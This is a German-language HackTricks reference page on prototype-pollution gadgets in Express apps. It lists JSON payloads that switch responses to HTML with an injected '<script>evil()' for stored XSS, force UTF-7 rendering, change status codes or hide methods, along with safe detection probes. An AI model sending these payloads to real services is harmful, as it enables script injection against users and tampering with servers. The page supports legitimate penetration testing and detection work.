# Express Prototype Pollution Gadgets

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) ist eine **Dark-Web**-unterst√ºtzte Suchmaschine, die **kostenlose** Funktionen bietet, um zu √ºberpr√ºfen, ob ein Unternehmen oder dessen Kunden durch **Stealer-Malware** **kompromittiert** wurden.

Das Hauptziel von WhiteIntel ist es, Konto√ºbernahmen und Ransomware-Angriffe zu bek√§mpfen, die durch informationsstehlende Malware verursacht werden.

Sie k√∂nnen ihre Website besuchen und ihre Engine **kostenlos** ausprobieren unter:

{% embed url="https://whiteintel.io" %}

***

## XSS-Antworten bereitstellen

**F√ºr weitere Details** [**sehen Sie sich die urspr√ºngliche Forschung an**](https://portswigger.net/research/server-side-prototype-pollution)

### √Ñndern Sie den JSON-Inhaltstyp in HTML

In einer Express-App, die eine **JSON-Inhaltstyp-Antwort** verwendet und ein JSON widerspiegelt:
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
In diesen F√§llen ist XSS normalerweise nicht mit einem JSON-Inhaltstyp m√∂glich. Mit Prototype Pollution k√∂nnen wir jedoch **Express verwirren, um eine HTML-Antwort bereitzustellen.** Diese Schwachstelle beruht darauf, dass die Anwendung **`res.send(obj)`** verwendet und den Body-Parser mit dem Inhaltstyp application/json nutzt.
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
Durch das **Verschmutzen** der **`body`**- und **`_body`**-Eigenschaften ist es m√∂glich, **Express dazu zu bringen, den HTML-Inhaltstyp** bereitzustellen und die `_body`-Eigenschaft widerzuspiegeln, was zu gespeichertem XSS f√ºhrt.

### UTF7 rendern

Es ist m√∂glich, dass Express **UTF-7-Inhalte rendert mit**:
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## Sichere Scanning-Techniken

### JSON-R√§ume

Die folgende PP wird Attribute innerhalb eines JSON einen zus√§tzlichen Raum geben, der die Funktionalit√§t nicht beeintr√§chtigt:
```json
{"__proto__":{"json spaces": " "}}
```
Dann sieht ein reflektiertes JSON so aus:
```json
{"foo":  "bar"} -- Note the extra space
```
### Exposed Headers

Der folgende PP-Gadget wird den Server dazu bringen, den HTTP-Header zur√ºckzusenden: **`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
Es erfordert, dass das **CORS-Modul installiert ist**

### **OPTIONS-Methode**

Mit dem folgenden Payload ist es m√∂glich, eine **Methode aus einer OPTIONS-Antwort zu verbergen**:
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **Status**

Es ist m√∂glich, den **zur√ºckgegebenen Statuscode** mit dem folgenden PP-Payload zu √§ndern:
```json
{"__proto__":{"status":510}}
```
### Fehler

Wenn Sie einem Prototypen mit einem primitiven Wert wie einem String zuweisen, erzeugt dies eine **no-op-Operation, da der Prototyp ein Objekt sein muss**. Wenn Sie versuchen, ein Prototypobjekt dem `Object.prototype` selbst zuzuweisen, wird dies **eine Ausnahme ausl√∂sen**. Wir k√∂nnen diese beiden Verhaltensweisen nutzen, um **festzustellen, ob die Prototypverschmutzung erfolgreich war**:
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### Reflected Value

Wenn eine Anwendung ein Objekt in ihrer Antwort enth√§lt, kann das Erstellen eines Attributs mit einem **ungew√∂hnlichen Namen neben `__proto__`** aufschlussreich sein. Insbesondere wenn **nur das ungew√∂hnliche Attribut in der Antwort zur√ºckgegeben wird**, k√∂nnte dies auf die Verwundbarkeit der Anwendung hinweisen:
```json
{"unusualName":"value","__proto__":"test"}
```
Dar√ºber hinaus bietet in Szenarien, in denen eine Bibliothek wie Lodash verwendet wird, das Setzen einer Eigenschaft sowohl √ºber Prototype Pollution (PP) als auch direkt im Objekt einen weiteren diagnostischen Ansatz. Wenn eine solche Eigenschaft aus der Antwort weggelassen wird, deutet dies darauf hin, dass Lodash die Existenz der Eigenschaft im Zielobjekt √ºberpr√ºft, bevor es zusammenf√ºhrt:
```javascript
{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}
// If 'b' is the only property reflected, this indicates prototype pollution in Lodash
```
## Misc

### Erlaube Punkte

Es gibt eine Option in Express, die es dir erm√∂glicht, **Objekte aus Abfragezeichenfolgenparametern** zu **erstellen**.\
Du k√∂nntest es definitiv in einer Fehler-**Kette** verwenden, um eine **Prototype Pollution-Sicherheitsanf√§lligkeit** auszunutzen.
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` erstellt ein Objekt in Node.**

## Referenzen

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) ist eine **Dark-Web**-unterst√ºtzte Suchmaschine, die **kostenlose** Funktionen anbietet, um zu √ºberpr√ºfen, ob ein Unternehmen oder dessen Kunden von **Stealer-Malware** **kompromittiert** wurden.

Das Hauptziel von WhiteIntel ist es, Konto√ºbernahmen und Ransomware-Angriffe zu bek√§mpfen, die durch informationsstehlende Malware verursacht werden.

Sie k√∂nnen ihre Website besuchen und ihre Engine **kostenlos** ausprobieren unter:

{% embed url="https://whiteintel.io" %}

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
